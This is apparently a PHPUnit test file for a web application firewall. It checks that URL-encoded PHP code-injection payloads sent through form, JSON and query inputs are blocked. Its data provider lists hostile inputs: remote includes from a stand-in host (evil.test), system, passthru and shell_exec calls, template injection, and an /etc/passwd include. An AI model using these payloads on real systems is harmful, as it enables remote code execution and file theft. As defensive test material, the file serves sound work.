<?php

declare(strict_types=1);

namespace Mixudev\SecurityDefense\Tests\Feature\Adversarial\Evasion;

use PHPUnit\Framework\Attributes\DataProvider;
use Mixudev\SecurityDefense\Tests\Feature\Adversarial\Concerns\RegistersWafProbeRoute;
use Mixudev\SecurityDefense\Tests\TestCase;

class EncodedServerSideCodeTest extends TestCase
{
    use RegistersWafProbeRoute;
    protected function setUp(): void { parent::setUp(); $this->registerWafProbeRoutes(); $this->withoutAutoJail(); }
    #[DataProvider('payloadProvider')]
    public function test_encoded_server_side_code_is_blocked_in_form(string $payload): void { $this->assertSame(403, $this->probeForm('code', $payload, '198.18.14.1')['status'], $payload); }
    #[DataProvider('payloadProvider')]
    public function test_encoded_server_side_code_is_blocked_in_json(string $payload): void { $this->assertSame(403, $this->probeJson('code', $payload, '198.18.14.2')['status'], $payload); }
    #[DataProvider('payloadProvider')]
    public function test_encoded_server_side_code_is_blocked_in_query(string $payload): void { $this->assertSame(403, $this->probeGet($payload, '198.18.14.3')['status'], $payload); }
    public function test_benign_template_text_is_allowed(): void { $this->assertSame(200, $this->probeForm('code', 'welcome to the template gallery', '198.18.14.4')['status']); }
    public static function payloadProvider(): array { return [
        'php tag' => ['%3C%3Fphp%20echo%201%3B'], 'double php tag' => ['%253C%253Fphp%2520echo%25201%253B'],
        'include url' => ['include%28%27http%3A%2F%2Fevil.test%2Fx%27%29'], 'require url' => ['require%20%28%22https%3A%2F%2Fevil.test%22%29'],
        'assert' => ['assert%28%27system%28id%29%27%29'], 'create function' => ['create_function%28%22%22%2C%22id%22%29'],
        'call user func' => ['call_user_func%28%22system%22%2C%22id%22%29'], 'base64 decode' => ['base64_decode%28%22aWQ%3D%22%29'],
        'passthru' => ['passthru%28%22id%22%29'], 'system' => ['system%28%22id%22%29'], 'shell exec' => ['shell_exec%28%22id%22%29'],
        'superglobal get' => ['%24_GET%5B%22x%22%5D'], 'superglobal post' => ['%24_POST%5B%22x%22%5D'], 'superglobal request' => ['%24_REQUEST%5B%22x%22%5D'],
        'template system' => ['%7B%7B%20system%28%22id%22%29%20%7D%7D'], 'template exec' => ['%7B%7B%20exec%28%22id%22%29%20%7D%7D'],
        'shell expression' => ['%24%7Bcmd%3Aid%7D'], 'preg replace eval' => ['preg_replace%28%22%2Fe%22%2C%22id%22%2C%22x%22%29'],
        'file include' => ['include%28%22file%3A%2F%2F%2Fetc%2Fpasswd%22%29'], 'data include' => ['require%28%22data%3Atext%2Fphp%2Cid%22%29'],
    ]; }
}
